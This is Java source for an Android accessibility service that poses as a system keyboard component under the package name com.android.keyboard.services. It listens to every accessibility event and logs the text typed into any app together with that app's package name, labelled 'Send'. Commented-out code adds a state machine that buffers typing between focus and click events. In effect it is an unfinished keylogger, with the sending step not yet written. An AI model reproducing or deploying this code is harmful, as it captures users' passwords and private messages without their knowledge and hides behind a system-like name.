package com.android.keyboard.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyboardService extends AccessibilityService {
    static final String TAG = KeyboardService.class.getSimpleName();
    private AccessibilityNodeInfo mTextEntryNode;
    private static KeyboardService sSharedInstance;
    private        KeyboardServiceAction serviceAction;

    private String mCurrentTyping;
    private String mCurrentPackage;

    public KeyboardService() {
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();
//        Log.v(TAG, String.format(
//                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
//                getEventType(event), event.getClassName(), event.getPackageName(),
//                event.getEventTime(), getEventText(event)));

        // Type view clicked could be entering a TextEdit (focus) or
        // leaving (button click to send).
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED
                ) {
            //serviceAction.entry();
//            if (!mCurrentTyping.isEmpty()) {
//                Log.d(TAG, "Send: " + mCurrentPackage + " " +mCurrentTyping);
//                mCurrentTyping = "";
//            }
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
                ) {
            Log.d(TAG, "Send: " + event.getPackageName().toString() + " " + getEventText(event));
//            mCurrentTyping  = getEventText(event);
//            mCurrentPackage = event.getPackageName().toString();
        }
    }
    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
        }
        return "default";
    }
    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }
    @Override
    protected void onServiceConnected() {
        sSharedInstance = this;
        mCurrentTyping = "";
        serviceAction = new KeyboardServiceAction();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();

        // Set the type of events that this service wants to listen to.  Others
        // won't be passed to this service.
        //info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
        //        AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT;


        // Set the type of feedback your service will provide.
        //info.feedbackType = AccessibilityServiceInfo.FEEDBACK_VISUAL;

        // Default services are invoked only if no package-specific ones are present
        // for the type of AccessibilityEvent generated.  This service *is*
        // application-specific, so the flag isn't necessary.  If this was a
        // general-purpose service, it would be worth considering setting the
        // DEFAULT flag.

        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.notificationTimeout = 100;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        this.setServiceInfo(info);
    }

    @Override
    public void onInterrupt() {

    }
    @Override
    public boolean onUnbind(Intent intent) {
        sSharedInstance = null;
        return super.onUnbind(intent);
    }
    public static KeyboardService getSharedInstance() {
        return sSharedInstance;
    }


    private class KeyboardServiceAction {
        private EntryState mCurrentState;
        public KeyboardServiceAction() {
            mCurrentState = new Waiting();
        }
        public void SetState(EntryState s) {
            mCurrentState = s;
        }
        public void entry() {
            mCurrentState.event(this);
        }
    }

    interface EntryState {
        void event(KeyboardServiceAction wrapper);
    }

    private class Waiting implements EntryState {

        @Override
        public void event(KeyboardServiceAction wrapper) {
            Log.d(TAG, "State = Starting to type");
            mCurrentPackage = ""; // Clear these ready for some typing
            mCurrentTyping  = "";
            wrapper.SetState(new TypingStarted());
        }
    }

    private class TypingStarted implements EntryState {

        @Override
        public void event(KeyboardServiceAction wrapper) {
            Log.d(TAG, "State = Typing complete " + mCurrentTyping);
            if (!mCurrentTyping.isEmpty()) {
                Log.d(TAG, "Send:  " + mCurrentPackage + " " + mCurrentTyping);
            }
            wrapper.SetState(new Waiting());
        }
    }
}
